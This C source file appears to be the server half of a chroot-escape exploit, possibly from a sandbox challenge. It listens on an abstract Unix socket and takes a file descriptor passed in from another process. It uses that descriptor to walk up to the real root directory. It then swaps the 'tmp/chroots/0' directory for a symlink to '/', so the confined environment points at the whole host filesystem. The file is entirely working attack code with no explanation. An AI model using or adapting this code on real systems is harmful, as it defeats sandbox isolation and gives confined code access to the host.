#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sched.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include "report.h"
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <stdlib.h>

//char *socket_path = "./socket";
char *socket_path = "\0hidden";

void my_err(char * msg)
{
    write_error("server", msg);
}
void my_log(char * msg, int arg)
{
    write_log("server", msg, arg);
}

int main() 
{
	struct sockaddr_un addr;
	char buf[100];
	int fd,cl,rc;

    report("server");

	if ( (fd = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) {
		my_err("socket error");
		exit(-1);
	}

	memset(&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
	if (*socket_path == '\0') {
		*addr.sun_path = '\0';
		strncpy(addr.sun_path+1, socket_path+1, sizeof(addr.sun_path)-2);
	}

    my_log("binding", 0);
	if (bind(fd, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
		my_err("bind error");
		exit(-1);
	}

    my_log("listening", 0);
	if (listen(fd, 5) == -1) {
		my_err("listen error");
		exit(-1);
	}

    my_log("accepting", 0);
	if ( (cl = accept(fd, NULL, NULL)) == -1) {
		my_err("accept error");
		return -1;
	}

    my_log("recving", 0);
	int remote_fd = recv_fd(cl);
	my_log("got fd", remote_fd);

    int real_root_fd = openat(remote_fd, "../../..", 0);
    if (real_root_fd < 0)
    {
        my_err("failed to open real_root");
    }
	my_log("root fd", real_root_fd);

	my_log("fchdiring", real_root_fd);
    int ret = fchdir(real_root_fd);
    if (ret != 0)
    {
        my_err("fchdir");
    }

    my_log("renaming", 0);
    ret = rename("tmp/chroots/0", "tmp/chroots/old_0");
    if (ret != 0)
    {
        my_err("rename");
    }

    my_log("link", 0);
    ret = symlink("/", "tmp/chroots/0");
    if (ret != 0)
    {
        my_err("link");
    }
    my_log("linked", 0);

	close(cl);

  return 0;
}

